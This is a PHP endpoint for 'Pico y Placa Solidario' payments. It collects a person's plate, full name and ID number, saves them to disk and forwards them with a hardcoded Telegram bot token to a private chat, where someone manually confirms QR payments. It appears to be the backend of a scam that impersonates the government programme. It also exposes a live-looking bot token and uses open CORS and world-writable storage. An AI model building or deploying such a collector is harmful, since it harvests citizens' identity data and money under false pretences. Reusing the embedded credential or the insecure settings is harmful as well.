<?php
// ═══════════════════════════════════════════
//  CREDENCIALES — solo viven en este archivo
// ═══════════════════════════════════════════
$BOT_TOKEN = '8641560926:AAFoOqOUQ_2oqG98-R-R3DCMKHqBwF8R4NU';
$CHAT_ID   = '-5044680802'; // número entero o string "-100xxxxxxxxxx" para grupos

// ═══════════════════════════════════════════
//  CORS
// ═══════════════════════════════════════════
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json; charset=UTF-8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit(); }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["error" => "Método no permitido"]);
    exit();
}

// ═══════════════════════════════════════════
//  Leer datos del frontend
// ═══════════════════════════════════════════
$body = json_decode(file_get_contents("php://input"), true);

$placa       = strtoupper(trim($body['placa']        ?? ''));
$monto       = intval($body['monto']                 ?? 0);
$idSolicitud = trim($body['idSolicitud']             ?? '');
$nombreComp  = trim($body['nombreCompleto']          ?? '');
$tipoDoc     = trim($body['tipoDocumento']           ?? '');
$numDoc      = trim($body['numeroDocumento']         ?? '');

if (!$placa || !$monto) {
    http_response_code(400);
    echo json_encode(["error" => "Se requieren placa y monto"]);
    exit();
}

// ═══════════════════════════════════════════
//  Directorio de pagos pendientes
// ═══════════════════════════════════════════
$payDir = sys_get_temp_dir() . '/pyp_payments';
if (!is_dir($payDir)) mkdir($payDir, 0777, true);

$paymentId = 'pyp_' . uniqid('', true);
$montoFmt  = '$' . number_format($monto, 0, ',', '.');

// ═══════════════════════════════════════════
//  Guardar pago pendiente en disco
// ═══════════════════════════════════════════
$payData = [
    'payment_id'     => $paymentId,
    'placa'          => $placa,
    'monto'          => $monto,
    'idSolicitud'    => $idSolicitud,
    'nombreCompleto' => $nombreComp,
    'tipoDocumento'  => $tipoDoc,
    'numeroDocumento'=> $numDoc,
    'status'         => 'pending',
    'created_at'     => date('c'),
    'message_id'     => null,
    'cus'            => null,
];
file_put_contents($payDir . '/' . $paymentId . '.json',
    json_encode($payData, JSON_UNESCAPED_UNICODE));

// ═══════════════════════════════════════════
//  Escaper texto para MarkdownV2
// ═══════════════════════════════════════════
function escMD($s) {
    return preg_replace('/([_*\[\]()~`>#+=|{}.!\-])/', '\\\\$1', (string)$s);
}

// ═══════════════════════════════════════════
//  Texto del mensaje
// ═══════════════════════════════════════════
$text  = "*Nueva solicitud Pico y Placa Solidario*\n\n";
$text .= "Solicitud: `" . escMD($idSolicitud) . "`\n";
$text .= "Placa: `" . escMD($placa) . "`\n";
$text .= "Persona: " . escMD($nombreComp) . "\n";
$text .= "Documento: " . escMD($tipoDoc) . " " . escMD($numDoc) . "\n";
$text .= "*Monto a pagar: " . escMD($montoFmt) . "*\n\n";
$text .= "El usuario esta realizando el pago por QR\\. Confirme o rechace una vez reciba el dinero\\.";

// chat_id: si es numérico usarlo como int
$chatIdFinal = is_numeric($CHAT_ID) ? (int)$CHAT_ID : $CHAT_ID;

$keyboard = [
    'inline_keyboard' => [[
        ['text' => 'Confirmar pago',    'callback_data' => 'confirm_' . $paymentId],
        ['text' => 'Pago no realizado', 'callback_data' => 'reject_'  . $paymentId],
    ]]
];

// ═══════════════════════════════════════════
//  Enviar a Telegram
// ═══════════════════════════════════════════
$tgPayload = json_encode([
    'chat_id'      => $chatIdFinal,
    'text'         => $text,
    'parse_mode'   => 'MarkdownV2',
    'reply_markup' => $keyboard,
], JSON_UNESCAPED_UNICODE);

$ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $tgPayload,
    CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_SSL_VERIFYPEER => true,
]);
$tgResp  = curl_exec($ch);
$curlErr = curl_error($ch);
curl_close($ch);

// Error de red
if ($curlErr) {
    http_response_code(502);
    echo json_encode([
        "ok"     => false,
        "error"  => "Error de conexión con Telegram",
        "detalle"=> $curlErr,
    ]);
    exit();
}

$tgData    = json_decode($tgResp, true);
$tgOk      = $tgData['ok'] ?? false;
$messageId = $tgData['result']['message_id'] ?? null;

// Error de la API de Telegram — devolver el detalle exacto para diagnosticar
if (!$tgOk) {
    http_response_code(502);
    echo json_encode([
        "ok"             => false,
        "payment_id"     => $paymentId,
        "message_id"     => null,
        "tg_error_code"  => $tgData['error_code']  ?? null,
        "tg_description" => $tgData['description'] ?? 'Error desconocido de Telegram',
    ]);
    exit();
}

// Éxito: actualizar archivo con message_id
$payData['message_id'] = $messageId;
file_put_contents($payDir . '/' . $paymentId . '.json',
    json_encode($payData, JSON_UNESCAPED_UNICODE));

echo json_encode([
    'ok'         => true,
    'payment_id' => $paymentId,
    'message_id' => $messageId,
]);